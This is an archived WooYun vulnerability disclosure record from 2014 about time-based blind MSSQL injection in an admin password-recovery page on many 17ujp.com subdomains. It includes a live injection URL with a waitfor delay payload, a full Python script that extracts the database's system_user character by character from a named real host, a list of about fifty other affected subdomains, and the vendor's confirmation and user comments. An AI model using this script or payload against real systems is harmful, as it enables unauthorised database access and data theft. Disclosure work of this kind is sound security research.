{"id": 46929, "wybug_id": "wooyun-2014-088834", "wybug_title": "同程旅游网多个站点同类MSSQL注射(附验证脚本)", "wybug_corp": "苏州同程旅游网络科技有限公司", "wybug_author": "lijiejie", "wybug_date": "2014-12-26 20:28", "wybug_open_date": "2015-02-09 20:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-09：\t细节向公众公开  简要描述： 同程旅游网多站点同类MSSQL注射(附验证脚本) 详细说明：  注入点：\nhttp://17349886.17ujp.com/Admin/AjaxForFindPwd.aspx?IsReseller=0&_=1419585952016&Account=123'; if (len(system_user)=10) waitfor delay '0:0:10'--\n以上是猜解system_user长度为10   漏洞证明：  逐字符猜解system_user，得到：\n17ujpadmin\n\n\n验证脚本：\n#encoding=gbkimport httplibimport timeimport stringimport sysimport randomimport urllibheaders = {    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',}payloads = list(string.ascii_lowercase)for i in range(0,10):    payloads.append(str(i))payloads += ['@','_', '.', '-', '\\\\', ' ']print 'Try to retrive user:'user = ''for i in range(1,11):    for payload in payloads:        try:            conn = httplib.HTTPConnection('17349886.17ujp.com', timeout=3)            s = \"if (ascii(substring(system_user,%s,1))=%s) waitfor delay '0:0:3' --\" % (i, ord(payload))            params = \"IsReseller=0&_=1419585952016&Account=123';\" + urllib.quote(s)            conn.request(method='GET', url= '/Admin/AjaxForFindPwd.aspx?' + params,                         headers = headers)            html_doc = conn.getresponse().read()            conn.close()            print '.',        except Exception, e:            user += payload            print '\\nIn progress]', user            break        print '\\n[Done] User is:', user\n应该是域名泛解析，发现多个站点都存在该注射：\nhttp://18377290.17ujp.comhttp://35369309.ctt.17ujp.comhttp://19871649.17ujp.comhttp://35369309.ct.17ujp.comhttp://1534423.17ujp.comhttp://33365104.ct.17ujp.comhttp://14479454.17ujp.comhttp://1134230.17ujp.comhttp://1184097.17ujp.comhttp://1393336.17ujp.comhttp://1334783.17ujp.comhttp://36403811.17ujp.comhttp://1190222.17ujp.comhttp://95241.17ujp.comhttp://35369309.17ujp.comhttp://33365104.17ujp.comhttp://1702437.ctt.17ujp.comhttp://1578794.17ujp.comhttp://8446.17ujp.comhttp://16687718.17ujp.comhttp://1381187.17ujp.comhttp://1191850.17ujp.comhttp://1196320.17ujp.comhttp://9938.17ujp.comhttp://66405.17ujp.comhttp://1191850.ct.17ujp.comhttp://17349886.17ujp.comhttp://1191850.ctt.17ujp.comhttp://2340837.17ujp.comhttp://1191850.cnc.17ujp.comhttp://4045321.17ujp.comhttp://9938.ctt.17ujp.comhttp://39100370.17ujp.comhttp://9938.cnc.17ujp.comhttp://1186224.17ujp.comhttp://9938.ct.17ujp.comhttp://1373099.17ujp.comhttp://980655.17ujp.comhttp://1792227.ct.17ujp.comhttp://1702437.17ujp.comhttp://1792227.ctt.17ujp.comhttp://1186435.17ujp.comhttp://1792227.cnc.17ujp.comhttp://1702437.ct.17ujp.comhttp://26751655.ctt.17ujp.comhttp://1702437.cnc.17ujp.comhttp://26751655.ct.17ujp.comhttp://1157668.17ujp.comhttp://26751655.cnc.17ujp.comhttp://1539098.17ujp.comhttp://10873993.ctt.17ujp.com\n   修复方案：  过滤   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-12-26 20:55 厂商回复： 感谢关注同程旅游，已在安排修复，谢谢李姐姐。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-26 20:31 |    \t\tCoffeeSafe \t\t\t( 普通白帽子  |\t\t\t        Rank:142 漏洞数:37        )\t\t \n  前排！    \n     2014-12-26 20:33 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  前排！    \n     2014-12-26 20:38 |    \t\t途牛旅游网(乌云厂商)\t\t \n  放开他，冲我来！    \n     2014-12-26 23:54 |    \t\t0x_Jin \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:37        | 微博：http://weibo.com/J1n9999)\t\t \n  李姐姐你又来了    \n     2015-01-06 09:27 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  李姐姐就是厉害    \n     2015-01-07 14:58 |    \t\t帅气小狼狗 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 汪汪汪)\t\t \n  @途牛旅游网 你们是基友吗？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}